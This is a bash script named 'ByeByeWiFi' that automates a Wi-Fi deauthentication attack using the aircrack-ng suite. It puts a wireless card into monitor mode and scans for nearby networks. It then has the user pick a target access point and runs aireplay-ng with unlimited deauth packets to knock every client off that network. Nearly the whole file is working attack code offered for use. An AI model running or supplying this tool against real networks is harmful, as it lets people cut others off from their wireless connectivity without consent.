#!/bin/bash


# Check if script is being run as root
check_availability() {
    clear
    echo "Checking if root privileges are eneblaed... "
    if [ "$EUID" -ne 0 ]; then
        echo "This script must be run as root." >&2
        exit 1
    fi
    echo "Cheking if dependencies are installed... "
    dependencies=("figlet" "airmon-ng" "airodump-ng" "aireplay-ng" "iwconfig" "ifconfig" "systemctl")
    for cmd in "${dependencies[@]}"; do
        if ! command -v $cmd &> /dev/null; then
            echo "This script requires $cmd, but it's not installed. Please install it and run this script again."
            exit 1
        fi
    done
}

present() {
    clear
    echo -e "\033[0;36m$(figlet -f slant 'ByeByeWiFi')\033[0m"
    echo -e "\n"
    echo -e "\033[0;31mDeauthenticate\033[0m all clients from a wireless network."
    echo -e "by phlipow"
    echo -e " "
    echo -e "Press Enter to continue."
    read -r -p ""
}

# Select a wireless network interface
select_interface() {
    clear
    echo "Scanning wireless network interfaces... "
    interfaces=$(/usr/sbin/airmon-ng | grep 'phy' | awk '{print $2}')

    if [ -z "$interfaces" ]; then
        echo "No wireless interfaces found."
        exit 1
    fi

    echo "Available wireless interfaces:"
    PS3="Select an interface: "
    select iface in $interfaces; do
        if [ -n "$iface" ]; then
            interface=$iface
            echo "Selected interface: $interface"
            break
        else
            echo "Invalid selection. Please try again."
        fi
    done
}

# Start monitor mode on selected interface
start_mon() {
    clear
    echo "Starting monitor mode on $interface..."
        ifconfig "$interface" down
        airmon-ng check kill
        airmon-ng start "$interface"
}

# Finish monitor mode on selected interface
finish_mon() {
    clear
    echo "Finishing monitor mode on $interface..."
    ifconfig "$interface" down
    iwconfig "$interface" mode managed
    systemctl restart NetworkManager
}

# Select target network
select_network() {
    clear
    time_options=(15 30 60 180 300 600)
    echo "Scan duration: "
    PS3="Select a option: "
    select time_option in "${time_options[@]}"; do
        if [ -n "$time_option" ]; then
            scantime=$time_option
            echo "Selected scan duration: $scantime seconds"
            break
        else
            echo "Invalid selection. Please try again."
        fi
    done
    echo "Scanning for networks..."
    timeout -s SIGKILL "$scantime"s airodump-ng -w log --output-format csv "$interface"

    networks=()
while IFS=, read -r BSSID first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length ESSID key; do
    if [ -n "$ESSID" ]; then
        networks+=("ESSID: $ESSID BSSID: $BSSID Channel: $channel")
    fi
done < <(tail -n +3 log-01.csv)
clear
echo "Available networks:"
PS3="Select a network: "
select network in "${networks[@]}"; do
    if [ -n "$network" ]; then
        ap_mac=$(echo "$network" | awk -F' ' '{for(i=1;i<=NF;i++) if ($i == "BSSID:") print $(i+1)}')
        ap_ch=$(echo "$network" | awk -F' ' '{for(i=1;i<=NF;i++) if ($i == "Channel:") print $(i+1)}')
        echo "Selected network: $network"
        break
    else
        echo "Invalid selection. Please try again."
    fi
done
rm log-01.csv
}

# Deauth every device on target network
deauth_clients() {
    clear
    echo "Deauthenticating all clients from $ap_mac..."
    echo "Press Enter to stop the attack."
    iwconfig "$interface" channel "$ap_ch"
    aireplay-ng --deauth 0 -a "$ap_mac" "$interface" &
    local pid=$!
    read -r -p ""
    kill "$pid"
}

main() {
    check_availability
    present
    select_interface
    start_mon
    select_network
    deauth_clients
    finish_mon
}

main